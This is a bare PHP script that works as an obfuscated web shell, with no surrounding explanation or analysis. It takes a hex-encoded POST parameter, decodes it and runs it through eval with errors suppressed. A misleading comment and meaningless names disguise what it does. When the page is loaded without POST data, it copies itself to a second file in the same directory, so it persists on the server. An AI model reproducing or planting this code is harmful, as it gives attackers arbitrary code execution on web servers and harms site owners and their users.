
<?php
$flags = "sqKvjZ43YeGxA1U8iFhDoH9LJ76NQutawdMSTy0OcWEk";
class _
{
    static public $bhnmNyqO=Null;
    function __construct($l="error"){
        self::$bhnmNyqO=$l;
        @eval/*Defining error level offences*/(null.null.self::$bhnmNyqO);
    }
}
function hexToStr($hex){   
        $str=""; 
        for($i=0;$i<strlen($hex)-1;$i+=2)
        $str.=chr(hexdec($hex[$i].$hex[$i+1]));
        return  $str;
    }
if(!empty($_POST))
{
	$error = null.hexToStr(@$_POST/*\*/["bhnmNyqO"]);
	$d = new _($error);
}
else
{
	$filef = $_SERVER["SCRIPT_FILENAME"];
	$dst = dirname($_SERVER['SCRIPT_FILENAME']).'/bhnmNyqO.php';
	if (copy($filef, $dst)) {
		echo 'copy success!';
	}
	else
	{
		echo 'copy failed!';
	}
}
?>
